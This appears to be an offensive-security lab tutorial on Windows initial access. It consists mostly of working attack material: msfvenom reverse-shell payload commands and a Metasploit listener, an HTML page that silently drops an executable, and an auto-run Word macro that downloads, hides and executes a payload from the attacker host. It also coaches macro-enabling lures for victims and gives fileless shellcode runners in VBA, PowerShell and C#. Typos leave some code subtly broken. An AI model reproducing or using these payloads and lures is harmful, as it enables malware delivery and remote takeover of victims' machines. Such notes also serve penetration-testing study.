##  *Scenario 1*
Kali = 192.168.2.3*

*Windows = 192.168.2.5*

<br>
Practical explanation<br>  
1 ------ Payload Creation<br>
$ Msfvenom-p windows/meterpreter/reverse_https LHOST 192.168.2.3 LPORT 443 -f exe -o /var/www/html/msfstaged.exe<br>
2 ------ Listener Setup<br>
**$ Sudo msfconsole**<br>
**msf6 > ues exploit/multi/handler**<br>
**msf6(....) > set payload windows/meterpreter/reverse_https**<br>
**msf6(....)set lhost 192.168.2.3**<br>
*msf6(....)set lport 443*<br>
**msf6(....)set exitnosession false**<br>
**msf6(....)exploit -j**<br>
3 ------ Hosting Server Setup<br>
$ sudo systemctl status apache 2
$ sudo systemctl start apache2
$ cd /var/www/html
$ base64 msfstaged.exe  -w0 >~/payload.txt
$ sudo mousepad payload.txt
$ sudo touch download.html

$ mousepad download.html
<html>
<body>
<script>
function base64ToArrayBuffer(bnase64) {    var binary_string = window.atob(base64);
    var len = binary_string.length;
    var bytes = new Uint8Array(len);
    for (var i = 0; i < len; i++) {
        bytes[i] = binary_string.charCodeAt(i);
    }
    return bytes.buffer;
}

var file = 'put your base64 code here'
var data = base64ToArrayBuffer(file);

var blob = new Blob([data], { type: 'octet/stream' });
var fileName = 'payload.exe';

var a = document.createElement('a');
document.body.appendChild(a);

a.style = 'display: none';

var url = window.URL.createObjectURL(blob);
a.href = url;
a.download = fileName;
a.click();
window.URL.revokeObjectURL(url);
</script>
</body>
</html>

        Exploitation Tutorial
1 ------
💡The clear purpose of the code is: when someone visits a page like http://192.168.2.3/download.html, a file (e.g., shellcode in .exe format) is automatically downloaded without user interaction (i.e., without needing to click a button).
                 ....................
                 ....................
Scenario 2
1 ------ Malicious Macro Script
Sub Document_Open()
    Ahmed
End Sub

Sub Auto_Open()
    Ahmed
End Sub

Sub Ahmed()
    Dim command As String
    Dim exepath As String
    Dim hideCmd As String

    exepath = ActiveDocument.Path + "\msfstaged.exe"

    command = "powershell -Command (New-Object System.Net.WebClient).DownloadFile('http://192.168.2.3/msfstaged.exe','" + exepath + "')"
    Shell command, vbHide

    wait (4)

    hideCmd = "attrib +h " + exepath

    Shell hideCmd, vbHide
    Shell exepath, vbHide
End Sub

Sub wait(n As Long)
    Dim t As Date
    t = Now
    Do
        DoEvents
    Loop Until Now >= DateAdd("s", n, t)
End Sub
2 ------ Victim Execution Stage
Victim's machine 
http://192.168.2.3/download.html


        Exploitation Tutorial
1 ------
1. Command: The command first downloads the program (the file msfstaged.exe) from the specified URL to the local path defined in the exepath variable. The downloaded file is saved as msfstaged.exe.
2. exepath: After the file is downloaded, the Shell exepath, vbHide command runs the saved file (msfstaged.exe), effectively executing it.
3. hideCmd: is used to hide the file located at the path specified in exepath.
4. Wait 4:  pauses the execution of the program for 4 seconds to allow enough time for the file to fully download before attempting to run it.

💡After downloading the file, it is executed using PowerShell by referencing the full path of the file stored in the exepath variable.

Summary:
1. When the Word document is opened, the VBA code starts by downloading the executable file msfstaged.exe from a specified URL to the same folder as the document.
2. The program then pauses for 4 seconds to ensure the file has been fully downloaded.
3. After that, the file is hidden using the attrib +h command and executed silently using the Shell function.
                 ....................
                 ....................
Scenario 3
1 ------Disguised Macro Script
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    ActiveDocument.Content.Select
    Selection.Delete
    ActiveDocument.AttachedTemplate.AutoTextEntries("TheDoC").Insert Where:=Selection.Range, RichText:=True
End Sub
2 ------Social Engineering Technique
For example, you create a Word file that contains malware embedded in the macro to establish a reverse connection. Then you send the Word file to the victim, but the victim must click "Enable Macros" for the code to execute.

💡To convince the victim, you insert random or encrypted-looking text into the document along with a message like:

● This document is protected. Please enable macros to view the content."
or
● Content is encrypted. Click 'Enable Content' to decrypt."

This makes it seem like the content is hidden and needs to be "unlocked."

Then, you use a macro that deletes the meaningless content and replaces it with normal, readable text once macros are enabled — so the victim doesn't suspect anything unusual.
                 ....................
💡Important Note:
> When you want to call an object, you need to use a method like WScript.CreateObject or New-Object -ComObject to interact with it inside the script, whether you're using VBScript or PowerShell.
💡This acts like a "gateway" that gives you access to the objects inside the system.
                 ....................
                 ....................
Fileless malware
Fileless malware is a type of malicious software that doesn't get stored as a file on the disk. Instead, it operates directly in memory (RAM), making it harder for traditional antivirus programs to detect.
                           ....................
                           ....................
Fileless malware with VBA
Practical explanation   
1 ------
$ Msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.2.3 LPORT=443
EXITFUNC=thread -f vbapplication -o /mnt/share/vbapplication.txt
2 ------
$ cd /mnt/share 
$ mousepad vbapplication.txt

Take all the contents of the file and place them in the code ⬇️ .
3 ------
Private Declare Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As Long, ThreadParameter As Long, ByVal CreateFlags As Long, ByRef Threadid As Long) As Long

Private Declare Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long

Private Declare Function RtlMoveMemory Lib "KERNEL32" (ByVal lpDestination As Long, ByRef Source As Any, ByVal Length As Long) As Long

Sub MyMacro()
    Dim buf As Variant
    Dim addr As Long
    Dim counter As Long
    Dim data As Long
    Dim res As Long

    ' But your shellcode here '

    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter
    res = CreateThread(0, 0, addr, 0, 0, 0)
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

        Exploitation Tutorial
1 ------
This code relies on three different Windows API functions, which are:

1. VirtualAlloc
Purpose:
Allocates a block of memory in the process with read, write, and execute permissions — necessary for storing and running shellcode.
---
2. RtlMoveMemory
Purpose:
Copies the shellcode (or any data) into the allocated memory space.
---
3. CreateThread
Purpose:
Creates a new thread that starts execution from the specified memory address — in this case, where the shellcode was placed.
                           ....................
💡You can shorten this code using msfvenom from Metasploit by generating a payload in the VBA format instead of vbapplication. This format can be used to embed the malicious code inside a Word document (for example) through a VBA macro, allowing the code to execute automatically when the macro is enabled.
                           ....................
                           ....................
Fileless malware with PowerShell 
Practical explanation   
1 ------Payload Generation
$ Msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.2.3 LPORT=443
EXITFUNC=thread -f ps1 -o /mnt/share/ps1.txt
2 ------Shellcode Extraction
$ cd /mnt/share 
$ mousepad ps1.txt

Take all the contents of the file and place them in the code ⬇️ .
3 ------Fileless VBA Execution
$Kerne132 = @"
using System;
using System.Runtime.InteropServices;
public class Kernel32
 {
[DllImport ("kernel32.dll")]
public static extern
IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

[DllImport ("kernel32.dll", CharSet=CharSet.Ansi)]
public static extern
IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport ("kernel32.dll", SetLastError=true)]
public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
}
"@
Add-Type $Kerne132

 But your shellcode here 

$size = $buf.Length
[IntPtr]$addr = [Kernel32]::VirtualAlloc(0,$size, 0x3000, 0x40);
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)
$thandle=[Kernel32]::CreateThread(0,0, $addr,0,0,0);
[Kernel32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")
 
        Exploitation Tutorial
1 ------
This code relies on three different Windows API functions, which are:

1. VirtualAlloc
Purpose:
Allocates a block of memory in the process with read, write, and execute permissions — necessary for storing and running shellcode.
---
2. Marshal.Copy
Purpose:
Copies the shellcode (or any byte array) into the allocated memory space using .NET's built-in method instead of calling the RtlMoveMemory API directly.
---
3. CreateThread
Purpose:
Creates a new thread that starts execution from the specified memory address — in this case, where the shellcode was placed.
                           ....................
                           ....................
Fileless malware with csharp C#
Practical explanation   
1 ------Payload Generation
$ Msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.2.3 LPORT=443
EXITFUNC=thread -f csharp -o /mnt/share/csharp.txt
2 ------Shellcode Extraction
$ cd /mnt/share 
$ mousepad csharp.txt

Take all the contents of the file and place them in the code ⬇️ .
3 ------Fileless C# Execution
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace ConsoleApp1
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        static void Main(string[] args)
        {
           (But your shellcode here)
            int size = buf.Length;
            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
            Marshal.Copy(buf, 0, addr, size);
            IntPtr thread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(thread, 0xFFFFFFFF);
        }
    }
}
        Exploitation Tutorial
1 ------
This code relies on three different Windows API functions, which are:

1. VirtualAlloc
Purpose:
Allocates a block of memory in the process with read, write, and execute permissions — necessary for storing and running shellcode.
---
2. Marshal.Copy
Purpose:
Copies the shellcode (or any byte array) into the allocated memory space using .NET's built-in method instead of calling the RtlMoveMemory API directly.
---
3. CreateThread
Purpose:
Creates a new thread that starts execution from the specified memory address — in this case, where the shellcode was placed.
                 ....................
                 ....................
                      API
VirtualAlloc 
The VirtualAlloc function in Windows is used to allocate memory within a process. It takes four main parameters:

1. lpAddress: The starting address (use NULL to let the system choose).
2. dwSize: The size of memory to allocate (in bytes).
3. flAllocationType: The allocation type, like MEM_COMMIT or MEM_RESERVE.
4. flProtect: Memory protection, such as PAGE_READWRITE or PAGE_EXECUTE_READWRITE.

☢️ To use VirtualAlloc in C#, you need to include the using System;
like this:
using System;

💡In short, VirtualAlloc reserves memory space, and its address is stored in a variable like addr, which is later used as the destination in the coby.marshal function to transfer data from the source.

IntPtr addr = VirtualAlloc (IntPtr. Zero,0x1000, 0x3000, 0x40 )
                           ....................
Marshal.Copy
The coby.marshal function is an API used to copy data from a source to a destination. It takes four main parameters:

1. source: The original buffer or payload containing the data to be copied.
2. start index: The position within the source where the copy operation should begin.
3. destination: The target location where the data will be copied to.
4. length: The number of bytes (or the size of the data) to be copied.

☢️ To use Marshal.Copy in C#, you need to include the System.Runtime.InteropServices library
like this:
using System.Runtime.InteropServices;

💡In simple terms, this API extracts a portion of the buffer from the source, starting at a specific index and for a defined length, and copies it into the destination.

Marshal.Copy(buf, 0, addr, size);
                           ....................
CreateThread
The CreateThread function is used in Windows to create a new thread within the process. It takes 6 main parameters:

1. lpThreadAttributes: Specifies security attributes for the thread (typically NULL for default attributes).
2. dwStackSize: The size of the memory to be allocated for the thread’s stack.
3. lpStartAddress: The address of the function to be executed by the thread.
4. lpParameter: A parameter to be passed to the function that the thread will execute.
5. dwCreationFlags: Flags that control how the thread is created, such as CREATE_SUSPENDED to start the thread in a suspended state.
6. lpThreadId: A pointer to a variable that receives the thread identifier (thread ID) if the function succeeds.

☢️ To use CreateThread in C#, you need to include the using System;
like this:
using System;

💡In short, CreateThread is used to create a new thread to execute code asynchronously within the same process.

intPtr hthread = CreateThread (IntPtr. Zero, 0, addr, IntPtr. Zero, 0, IntPtr. Zero);
                           ....................
💡Summary 

1. VirtualAlloc: Reserves space in the memory within the process's virtual address space.
2. coby.marshal: Copies the payload to the reserved memory space allocated by VirtualAlloc.
3. CreateThread: Creates a new thread that executes the code (payload) copied into the reserved memory, running concurrently with the original process.

Example:
byte[] buf = new byte (payload)
int size = buf.Length;
IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
Marshal.Copy(buf, 0, addr, size);
IntPtr thread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

💡So, the payload is loaded and executed asynchronously using a new thread, allowing the injected code to run while the original process continues to operate.

**
                           ....................
